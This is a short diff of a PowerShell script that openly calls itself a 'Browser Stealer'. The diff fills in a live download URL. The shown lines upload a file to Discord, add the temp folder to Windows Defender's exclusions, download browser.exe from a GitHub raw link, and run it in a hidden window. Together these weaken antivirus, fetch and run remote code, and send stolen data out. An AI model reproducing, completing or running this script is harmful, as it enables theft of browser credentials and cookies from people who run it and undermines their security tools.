@@ -53,7 +53,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName
 Add-MpPreference -ExclusionPath $env:tmp
 
 # Download the exe and save it to temp directory
-iwr "COMING SOON" -outfile "$env:tmp\browser.exe"
+iwr "https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/browser.exe" -outfile "$env:tmp\browser.exe"
 
 # Execute the Browser Stealer
 cd $env:tmp;Start-Process -FilePath "$env:tmp\browser.exe" -WindowStyle h -Wait
